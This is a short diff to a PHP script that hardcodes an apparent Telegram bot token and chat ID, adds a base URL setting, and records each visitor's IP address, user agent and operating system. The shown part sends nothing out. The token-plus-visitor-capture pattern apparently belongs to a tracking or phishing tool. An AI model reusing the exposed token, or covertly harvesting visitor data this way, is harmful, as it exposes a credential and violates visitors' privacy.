@@ -1,10 +1,14 @@
 <?php
   $token = '1628978126:AAEWVJZiYvea6uSpIZt9UOKhlmMsAUH34HM';
   $chat_id = '1322044003';
+  //Follow this pattern $URL = 'http://yourwebsite.com/grow'
+  $URL = 'http://localhost/grow';
+  
   /**
  * @param $user_agent null
  * @return string
  */
+
 function getOS($user_agent = null)
 {
     if(!isset($user_agent) && isset($_SERVER['HTTP_USER_AGENT'])) {
@@ -137,7 +141,7 @@ function getOS($user_agent = null)
 
     return 'Unknown';
 }
-  $agent = $_SERVER["HTTP_USER_AGENT"];
+  $agent = $_SERVER['HTTP_USER_AGENT'];
   $ip = $_SERVER['REMOTE_ADDR'];
   $user_os = getOS();
 ?>
